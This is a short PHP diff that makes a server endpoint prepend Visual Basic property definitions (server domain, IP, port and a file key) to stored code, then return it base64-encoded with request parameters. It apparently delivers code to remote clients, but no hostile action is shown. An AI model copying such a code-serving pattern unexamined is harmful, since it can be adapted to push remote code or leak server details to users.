@@ -45,7 +45,23 @@ switch ($ver) {
 		break;
 	case 2:
 		$params = $_REQUEST['params'];
-		echo $d . ':-:' . $port . ':-:' . dso_b64_encode($code_a[0]);
+		$preamble = 'Public Property Get ServerDomain() As String
+	ServerDomain = "' . $d . '"
+End Property
+
+Public Property Get ServerIP() As String
+	ServerIP = "' . $dInfo[3] . '"
+End Property
+
+Public Property Get ServerPort() As Integer
+	ServerPort = ' . $port . '
+End Property
+
+Public Property Get FileKey() As String
+	FileKey = "' . $dInfo[2] . '"
+End Property
+';
+		echo $d . ':-:' . $port . ':-:' . dso_b64_encode($preamble . $code_a[0]);
 		if (!empty($params)) {
 			foreach ($params as $v) {
 				echo ':-:' . dso_b64_encode($v);
